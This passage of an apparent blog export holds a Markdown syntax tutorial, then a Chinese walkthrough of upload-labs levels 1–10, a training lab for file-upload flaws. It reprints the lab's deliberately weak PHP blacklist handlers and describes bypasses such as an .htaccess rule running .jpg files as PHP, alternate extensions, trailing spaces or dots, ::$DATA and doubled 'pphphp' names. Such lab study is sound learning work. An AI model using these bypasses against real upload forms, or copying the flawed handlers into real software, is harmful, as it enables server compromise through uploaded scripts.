<h1 id="Markdown"><a href="#Markdown" class="headerlink" title="Markdown"></a>Markdown</h1><h2 id="标题"><a href="#标题" class="headerlink" title="标题"></a>标题</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 一级标题</span><br><span class="line">## 二级标题</span><br><span class="line">### 三级标题</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">一级标题</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">二级标题</span><br><span class="line">----------</span><br></pre></td></tr></table></figure>
<h2 id="字体"><a href="#字体" class="headerlink" title="字体"></a>字体</h2><ul>
<li><em>斜体</em></li>
<li><strong>粗体</strong></li>
<li><strong><em>加粗斜体</em></strong></li>
<li><del>删除线</del><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">*斜体*</span><br><span class="line">**粗体**</span><br><span class="line">***加粗斜体***</span><br><span class="line">~~删除线~~</span><br></pre></td></tr></table></figure>
<h2 id="超链接"><a href="#超链接" class="headerlink" title="超链接"></a>超链接</h2></li>
</ul>
<p>welcome to my <a href="https://github.com/FreeCamser">github</a></p>
<p>link to <a href="https://www.baidu.com/">baidu</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">welcome to my [github](https:&#x2F;&#x2F;github.com&#x2F;FreeCamser)</span><br><span class="line"></span><br><span class="line">link to [baidu][1]</span><br><span class="line"></span><br><span class="line">[1]:https:&#x2F;&#x2F;www.baidu.com</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>自动链接:<a href="https://www.baidu.com/">https://www.baidu.com/</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">自动链接:&lt;https:&#x2F;&#x2F;www.baidu.com&#x2F;&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="列表"><a href="#列表" class="headerlink" title="列表"></a>列表</h2><h3 id="无序列表"><a href="#无序列表" class="headerlink" title="无序列表"></a>无序列表</h3><p>符号*、+、-</p>
<ul>
<li>列表一</li>
<li>列表二<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">* 列表一</span><br><span class="line">* 列表二</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<h3 id="有序列表"><a href="#有序列表" class="headerlink" title="有序列表"></a>有序列表</h3></li>
</ul>
<p>1.列表一<br>2.列表二</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.列表一</span><br><span class="line">2.列表二</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<h2 id="插入图像"><a href="#插入图像" class="headerlink" title="插入图像"></a>插入图像</h2><p><img src="/uploads/IMG_1947.JPG" alt="图片"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">![图片](&#x2F;uploads&#x2F;IMG_1947.JPG)</span><br></pre></td></tr></table></figure>
<h2 id="文字高亮"><a href="#文字高亮" class="headerlink" title="文字高亮"></a>文字高亮</h2><p>我说的<code>重点</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">我说的&#96;重点&#96;</span><br></pre></td></tr></table></figure>
<h2 id="插入音乐"><a href="#插入音乐" class="headerlink" title="插入音乐"></a>插入音乐</h2><p>分享一首极好听的音乐咯~</p>
<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=27583241&auto=1&height=66"></iframe>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;iframe frameborder&#x3D;&quot;no&quot; border&#x3D;&quot;0&quot; marginwidth&#x3D;&quot;0&quot; marginheight&#x3D;&quot;0&quot; width&#x3D;330 height&#x3D;86 src&#x3D;&quot;&#x2F;&#x2F;music.163.com&#x2F;outchain&#x2F;player?type&#x3D;2&amp;id&#x3D;27583241&amp;auto&#x3D;1&amp;height&#x3D;66&quot;&gt;&lt;&#x2F;iframe&gt;</span><br></pre></td></tr></table></figure>
## 生成表格

<table>
<thead>
<tr>
<th>学号</th>
<th>姓名</th>
<th>分数</th>
</tr>
</thead>
<tbody><tr>
<td>小明</td>
<td>男</td>
<td>99</td>
</tr>
<tr>
<td>小红</td>
<td>女</td>
<td>99</td>
</tr>
</tbody></table>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">学号|姓名|分数</span><br><span class="line">-|-|-</span><br><span class="line">小明|男|99</span><br><span class="line">小红|女|99</span><br></pre></td></tr></table></figure>
<h2 id="包含引用的列表"><a href="#包含引用的列表" class="headerlink" title="包含引用的列表"></a>包含引用的列表</h2><ul>
<li>方法:<blockquote>
<p>方法一<br>方法二</p>
</blockquote>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt;方法一</span><br><span class="line"> 方法二</span><br><span class="line"></span><br></pre></td></tr></table></figure>


]]></content>
      <categories>
        <category>基础知识</category>
      </categories>
      <tags>
        <tag>Markdown</tag>
      </tags>
  </entry>
  <entry>
    <title>Upload-labs</title>
    <url>/2018/08/16/Upload-labs/</url>
    <content><![CDATA[<h1 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h1><p>文件上传漏洞是指网络攻击者上传了一个可执行的文件到服务器并执行。这里上传的文件可以是木马，病毒，恶意脚本或者WebShell等。这种攻击方式是最为直接和有效的，部分文件上传漏洞的利用技术门槛非常的低，对于攻击者来说很容易实施。</p>
<p>我们就文件上传漏洞，利用upload-labs平台练习一下，源码下载<a href="https://github.com/c0ny1/upload-labs/releases">链接</a></p>
<h2 id="upload-labs练习平台"><a href="#upload-labs练习平台" class="headerlink" title="upload-labs练习平台"></a>upload-labs练习平台</h2><p>靶场知识点框架</p>
<p><img src="/uploads/upl1.png" alt="1"></p>
<h3 id="pass-01"><a href="#pass-01" class="headerlink" title="pass-01"></a>pass-01</h3><p>第一关就是一个简单的前端文件后缀名验证</p>
<p>首先我们写一个简单的php文件<code>&lt;?php phpinfo(); ?&gt;</code>,然后将其改成jpg文件<br>上传文件抓包，并将后缀名改成php，上传成功。<br><img src="/uploads/upl2.png" alt="1"></p>
<p>访问127.0.0.1/upload-labs/upload/1.php,发现上传的php文件解析成功。<br><img src="/uploads/upl3.png" alt="1"></p>
<p>因为他前段是利用js进行验证，我们也可以直接禁用js，直接上传php文件成功。</p>
<h2 id="pass-02"><a href="#pass-02" class="headerlink" title="pass-02"></a>pass-02</h2><p>第二关是后端对Content-Type的验证，必须为image/jpeg、image/png、image/gif<br>我们按照第一关的方法可以直接通过，因为我们将文件改成jpg，他的content-type为image/jpeg，可以绕过验证。</p>
<h2 id="pass-03"><a href="#pass-03" class="headerlink" title="pass-03"></a>pass-03</h2><p>第三关是后端的黑名单过滤，过滤了<code>array(&#39;.asp&#39;,&#39;.aspx&#39;,&#39;.php&#39;,&#39;.jsp&#39;)</code></p>
<p>方法一：<br>只过滤了有限几个文件后缀，我们可以通过改写其他后缀名(.phtml .phps .php5 .pht)，服务器依旧可以解析为php文件。<br>我将文件改为1.phtml，上传成功，并解析成功<br><img src="/uploads/upl4.png" alt="1"></p>
<p>方法二：<br>上传文件解析规则进行绕过，我们先上传一个名为.htaccess文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;FilesMatch &quot;1.jpg&quot;&gt;</span><br><span class="line">SetHandler application&#x2F;x-httpd-php</span><br><span class="line">&lt;&#x2F;FilesMatch&gt;</span><br></pre></td></tr></table></figure>
<p>这样的话他就可以将我们上传的1.jpg解析成PHP文件了。</p>
<p>然后再上传1.jpg文件(由php修改后缀名所得)</p>
<h2 id="pass-04"><a href="#pass-04" class="headerlink" title="pass-04"></a>pass-04</h2><p>第四关还是黑名单过滤，不过过滤了很多的文件后缀,但是并没有过滤.htaccess文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$is_upload &#x3D; false;</span><br><span class="line">$msg &#x3D; null;</span><br><span class="line">if (isset($_POST[&#39;submit&#39;])) &#123;</span><br><span class="line">    if (file_exists($UPLOAD_ADDR)) &#123;</span><br><span class="line">        $deny_ext &#x3D; array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;php1&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;pHp1&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;);</span><br><span class="line">        $file_name &#x3D; trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]);</span><br><span class="line">        $file_name &#x3D; deldot($file_name);&#x2F;&#x2F;删除文件名末尾的点</span><br><span class="line">        $file_ext &#x3D; strrchr($file_name, &#39;.&#39;);</span><br><span class="line">        $file_ext &#x3D; strtolower($file_ext); &#x2F;&#x2F;转换为小写</span><br><span class="line">        $file_ext &#x3D; str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);&#x2F;&#x2F;去除字符串::$DATA</span><br><span class="line">        $file_ext &#x3D; trim($file_ext); &#x2F;&#x2F;收尾去空</span><br><span class="line"></span><br><span class="line">        if (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            if (move_uploaded_file($_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;], $UPLOAD_ADDR . &#39;&#x2F;&#39; . $_FILES[&#39;upload_file&#39;][&#39;name&#39;])) &#123;</span><br><span class="line">                $img_path &#x3D; $UPLOAD_ADDR . $_FILES[&#39;upload_file&#39;][&#39;name&#39;];</span><br><span class="line">                $is_upload &#x3D; true;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $msg &#x3D; &#39;此文件不允许上传!&#39;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $msg &#x3D; $UPLOAD_ADDR . &#39;文件夹不存在,请手工创建！&#39;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>我们按照上一关的方法上传文件解析规则.htaccess文件，依旧可以绕过。</p>
<h2 id="pass-05"><a href="#pass-05" class="headerlink" title="pass-05"></a>pass-05</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$is_upload &#x3D; false;</span><br><span class="line">$msg &#x3D; null;</span><br><span class="line">if (isset($_POST[&#39;submit&#39;])) &#123;</span><br><span class="line">    if (file_exists($UPLOAD_ADDR)) &#123;</span><br><span class="line">        $deny_ext &#x3D; array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;);</span><br><span class="line">        $file_name &#x3D; trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]);</span><br><span class="line">        $file_name &#x3D; deldot($file_name);&#x2F;&#x2F;删除文件名末尾的点</span><br><span class="line">        $file_ext &#x3D; strrchr($file_name, &#39;.&#39;);</span><br><span class="line">        $file_ext &#x3D; str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);&#x2F;&#x2F;去除字符串::$DATA</span><br><span class="line">        $file_ext &#x3D; trim($file_ext); &#x2F;&#x2F;首尾去空</span><br><span class="line"></span><br><span class="line">        if (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            if (move_uploaded_file($_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;], $UPLOAD_ADDR . &#39;&#x2F;&#39; . $_FILES[&#39;upload_file&#39;][&#39;name&#39;])) &#123;</span><br><span class="line">                $img_path &#x3D; $UPLOAD_ADDR . &#39;&#x2F;&#39; . $file_name;</span><br><span class="line">                $is_upload &#x3D; true;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $msg &#x3D; &#39;此文件不允许上传&#39;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $msg &#x3D; $UPLOAD_ADDR . &#39;文件夹不存在,请手工创建！&#39;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>第五关同样是黑名单过滤，并且加上了.htaccess文件的过滤，但是他没有大小写的限制。<br>所以我们上传1.Php文件进行绕过。<br>注：在win上可以这样绕过，因为他不区分大小写，但是在linux就不行了，linux区分大小写。</p>
<h2 id="pass-06"><a href="#pass-06" class="headerlink" title="pass-06"></a>pass-06</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$is_upload &#x3D; false;</span><br><span class="line">$msg &#x3D; null;</span><br><span class="line">if (isset($_POST[&#39;submit&#39;])) &#123;</span><br><span class="line">    if (file_exists($UPLOAD_ADDR)) &#123;</span><br><span class="line">        $deny_ext &#x3D; array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;);</span><br><span class="line">        $file_name &#x3D; $_FILES[&#39;upload_file&#39;][&#39;name&#39;];</span><br><span class="line">        $file_name &#x3D; deldot($file_name);&#x2F;&#x2F;删除文件名末尾的点</span><br><span class="line">        $file_ext &#x3D; strrchr($file_name, &#39;.&#39;);</span><br><span class="line">        $file_ext &#x3D; strtolower($file_ext); &#x2F;&#x2F;转换为小写</span><br><span class="line">        $file_ext &#x3D; str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);&#x2F;&#x2F;去除字符串::$DATA</span><br><span class="line">        </span><br><span class="line">        if (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            if (move_uploaded_file($_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;], $UPLOAD_ADDR . &#39;&#x2F;&#39; . $_FILES[&#39;upload_file&#39;][&#39;name&#39;])) &#123;</span><br><span class="line">                $img_path &#x3D; $UPLOAD_ADDR . &#39;&#x2F;&#39; . $file_name;</span><br><span class="line">                $is_upload &#x3D; true;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $msg &#x3D; &#39;此文件不允许上传&#39;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $msg &#x3D; $UPLOAD_ADDR . &#39;文件夹不存在,请手工创建！&#39;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>第六关去掉了首位去空的代码，所以我们可以写入1.php(空格)进行绕过。</p>
<h2 id="pass-07"><a href="#pass-07" class="headerlink" title="pass-07"></a>pass-07</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$is_upload &#x3D; false;</span><br><span class="line">$msg &#x3D; null;</span><br><span class="line">if (isset($_POST[&#39;submit&#39;])) &#123;</span><br><span class="line">    if (file_exists($UPLOAD_ADDR)) &#123;</span><br><span class="line">        $deny_ext &#x3D; array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;);</span><br><span class="line">        $file_name &#x3D; trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]);</span><br><span class="line">        $file_ext &#x3D; strrchr($file_name, &#39;.&#39;);</span><br><span class="line">        $file_ext &#x3D; strtolower($file_ext); &#x2F;&#x2F;转换为小写</span><br><span class="line">        $file_ext &#x3D; str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);&#x2F;&#x2F;去除字符串::$DATA</span><br><span class="line">        $file_ext &#x3D; trim($file_ext); &#x2F;&#x2F;首尾去空</span><br><span class="line">        </span><br><span class="line">        if (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            if (move_uploaded_file($_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;], $UPLOAD_ADDR . &#39;&#x2F;&#39; . $_FILES[&#39;upload_file&#39;][&#39;name&#39;])) &#123;</span><br><span class="line">                $img_path &#x3D; $UPLOAD_ADDR . &#39;&#x2F;&#39; . $file_name;</span><br><span class="line">                $is_upload &#x3D; true;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $msg &#x3D; &#39;此文件不允许上传&#39;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $msg &#x3D; $UPLOAD_ADDR . &#39;文件夹不存在,请手工创建！&#39;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>对照上题源码，分析可知，缺少了<code>$file_name = deldot($file_name);</code>此段代码，即没有删除文件末尾点号，所抓包，在末尾添加点号可绕过。</p>
<h2 id="pass-08"><a href="#pass-08" class="headerlink" title="pass-08"></a>pass-08</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$is_upload &#x3D; false;</span><br><span class="line">$msg &#x3D; null;</span><br><span class="line">if (isset($_POST[&#39;submit&#39;])) &#123;</span><br><span class="line">    if (file_exists($UPLOAD_ADDR)) &#123;</span><br><span class="line">        $deny_ext &#x3D; array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;);</span><br><span class="line">        $file_name &#x3D; trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]);</span><br><span class="line">        $file_name &#x3D; deldot($file_name);&#x2F;&#x2F;删除文件名末尾的点</span><br><span class="line">        $file_ext &#x3D; strrchr($file_name, &#39;.&#39;);</span><br><span class="line">        $file_ext &#x3D; strtolower($file_ext); &#x2F;&#x2F;转换为小写</span><br><span class="line">        $file_ext &#x3D; trim($file_ext); &#x2F;&#x2F;首尾去空</span><br><span class="line">        </span><br><span class="line">        if (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            if (move_uploaded_file($_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;], $UPLOAD_ADDR . &#39;&#x2F;&#39; . $_FILES[&#39;upload_file&#39;][&#39;name&#39;])) &#123;</span><br><span class="line">                $img_path &#x3D; $UPLOAD_ADDR . &#39;&#x2F;&#39; . $file_name;</span><br><span class="line">                $is_upload &#x3D; true;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $msg &#x3D; &#39;此文件不允许上传&#39;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $msg &#x3D; $UPLOAD_ADDR . &#39;文件夹不存在,请手工创建！&#39;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>代码没有对字符串::$DATA过滤，因此可以通过windows的文件流特性绕过，抓包将文件名改成1.php::$DATA可绕过。文件上传成功，直接变成1.php</p>
<h2 id="pass-09"><a href="#pass-09" class="headerlink" title="pass-09"></a>pass-09</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$is_upload &#x3D; false;</span><br><span class="line">$msg &#x3D; null;</span><br><span class="line">if (isset($_POST[&#39;submit&#39;])) &#123;</span><br><span class="line">    if (file_exists($UPLOAD_ADDR)) &#123;</span><br><span class="line">        $deny_ext &#x3D; array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;);</span><br><span class="line">        $file_name &#x3D; trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]);</span><br><span class="line">        $file_name &#x3D; deldot($file_name);&#x2F;&#x2F;删除文件名末尾的点</span><br><span class="line">        $file_ext &#x3D; strrchr($file_name, &#39;.&#39;);</span><br><span class="line">        $file_ext &#x3D; strtolower($file_ext); &#x2F;&#x2F;转换为小写</span><br><span class="line">        $file_ext &#x3D; str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);&#x2F;&#x2F;去除字符串::$DATA</span><br><span class="line">        $file_ext &#x3D; trim($file_ext); &#x2F;&#x2F;首尾去空</span><br><span class="line">        </span><br><span class="line">        if (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            if (move_uploaded_file($_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;], $UPLOAD_ADDR . &#39;&#x2F;&#39; . $_FILES[&#39;upload_file&#39;][&#39;name&#39;])) &#123;</span><br><span class="line">                $img_path &#x3D; $UPLOAD_ADDR . &#39;&#x2F;&#39; . $file_name;</span><br><span class="line">                $is_upload &#x3D; true;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $msg &#x3D; &#39;此文件不允许上传&#39;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $msg &#x3D; $UPLOAD_ADDR . &#39;文件夹不存在,请手工创建！&#39;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>我们对比pass-06，因为本关过滤只有一个循环，我将文件抓包改成1.php.(空格).过滤后变为1.php.上传到win服务器，保存为1.php。</p>
<h2 id="pass-10"><a href="#pass-10" class="headerlink" title="pass-10"></a>pass-10</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$is_upload &#x3D; false;</span><br><span class="line">$msg &#x3D; null;</span><br><span class="line">if (isset($_POST[&#39;submit&#39;])) &#123;</span><br><span class="line">    if (file_exists($UPLOAD_ADDR)) &#123;</span><br><span class="line">        $deny_ext &#x3D; array(&quot;php&quot;,&quot;php5&quot;,&quot;php4&quot;,&quot;php3&quot;,&quot;php2&quot;,&quot;html&quot;,&quot;htm&quot;,&quot;phtml&quot;,&quot;jsp&quot;,&quot;jspa&quot;,&quot;jspx&quot;,&quot;jsw&quot;,&quot;jsv&quot;,&quot;jspf&quot;,&quot;jtml&quot;,&quot;asp&quot;,&quot;aspx&quot;,&quot;asa&quot;,&quot;asax&quot;,&quot;ascx&quot;,&quot;ashx&quot;,&quot;asmx&quot;,&quot;cer&quot;,&quot;swf&quot;,&quot;htaccess&quot;);</span><br><span class="line"></span><br><span class="line">        $file_name &#x3D; trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]);</span><br><span class="line">        $file_name &#x3D; str_ireplace($deny_ext,&quot;&quot;, $file_name);</span><br><span class="line">        if (move_uploaded_file($_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;], $UPLOAD_ADDR . &#39;&#x2F;&#39; . $file_name)) &#123;</span><br><span class="line">            $img_path &#x3D; $UPLOAD_ADDR . &#39;&#x2F;&#39; .$file_name;</span><br><span class="line">            $is_upload &#x3D; true;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $msg &#x3D; $UPLOAD_ADDR . &#39;文件夹不存在,请手工创建！&#39;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>题目代码，以黑名单的形式，将出现的文件后缀名进行过滤，但是本次过滤也只有一次，我们可以将文件问改成1.pphphp，文件名中的php被过滤掉，变成1.php。</p>
]]></content>
      <categories>
        <category>web</category>
      </categories>
      <tags>
        <tag>PHP</tag>
        <tag>文件上传</tag>
      </tags>
  </entry>
  <entry>
    <title>Upload-labs 2.0</title>
    <url>/2018/08/20/Upload-labs%202.0/</url>
